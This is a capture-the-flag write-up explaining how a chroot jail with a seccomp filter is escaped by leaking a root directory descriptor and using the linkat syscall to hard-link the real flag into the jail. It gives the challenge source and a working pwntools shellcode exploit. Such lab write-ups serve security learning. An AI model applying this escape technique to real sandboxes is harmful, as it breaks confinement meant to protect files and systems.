#metadata(
  (
    title: "Bypassing chroot with linkat",
    description: "Using the linkat syscall to create a hard link to the real flag inside the jail, bypassing chroot restrictions.",
    date: "2025-12-30",
    order: 5,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Bypassing Chroot with Linkat
== Challenge Source Code

```c
#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp) {
  assert(argc > 0);

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 1);

  assert(argc > 1);

  // Checking to make sure you're not trying to open the flag.
  assert(strstr(argv[1], "flag") == NULL);

  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);

  char jail_path[] = "./jail-XXXXXX";
  assert(mkdtemp(jail_path) != NULL);

  assert(chroot(jail_path) == 0);

  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode =
      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANON, 0, 0);
  assert(shellcode == (void *)0x1337000);

  int shellcode_size = read(0, shellcode, 0x1000);

  scmp_filter_ctx ctx;

  ctx = seccomp_init(SCMP_ACT_KILL);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

  assert(seccomp_load(ctx) == 0);

  ((void (*)())shellcode)();
}
```

== Vulnerability Analysis

This challenge is similar to previous levels where we leak a file descriptor to the root directory. However, the `openat` syscall is now blocked by seccomp. Instead, `linkat` is allowed.

```c
assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
```

The `linkat` syscall allows creating a hard link to a file. Crucially, it accepts directory file descriptors to resolve paths, just like `openat`.

== Exploitation Plan

1. *Leak Root FD:* Execute the binary with `/` to get a file descriptor (FD 3) pointing to the host's root.
2. *Create a Link:* Use `linkat` to create a hard link from the real flag (relative to the leaked root FD) to a file inside our current directory (the jail).
  *   `olddirfd`: 3 (Host Root)
  *   `oldpath`: "flag"
  *   `newdirfd`: AT_FDCWD (Current Directory / Jail Root)
  *   `newpath`: "flag_link"
3. *Read the Link:* Since the link is now inside our jail, we can use the standard `open` syscall to read it.

== Exploit Script

The following Python script uses `shellcraft` to generate the assembly for our `linkat`-based escape. Since `exit` is not explicitly allowed in the seccomp whitelist, we use an infinite loop (`jmp .`) at the end of the shellcode to prevent the process from being terminated before we can read the flag from stdout.

```python
from pwn import *

elf = context.binary = ELF("./challenge")

# Pass '/' to leak the root FD
p = process([elf.path, "/"])

# Shellcraft exploit refactored
# 1. linkat(3, "flag", AT_FDCWD, "flag_link", 0)
#    - olddirfd: 3 (leaked root FD)
#    - oldpath: "flag" (relative to FD 3)
#    - newdirfd: -100 (AT_FDCWD, current jail dir)
#    - newpath: "flag_link"
#    - flags: 0
sc = shellcraft.linkat(3, "flag", -100, "flag_link", 0)

# 2. open("flag_link", O_RDONLY)
sc += shellcraft.open("flag_link", constants.O_RDONLY)

# 3. sendfile(1, fd, 0, 100)
#    - out_fd: 1 (stdout)
#    - in_fd: 'rax' (result from open)
sc += shellcraft.sendfile(1, 'rax', 0, 100)

# 4. Infinite loop to prevent exit (SIGSYS)
sc += "jmp ."

# Assemble the shellcode
shellcode = asm(sc)

p.send(shellcode)

# Read output
print(p.recvall(timeout=1).decode())

p.close()
```
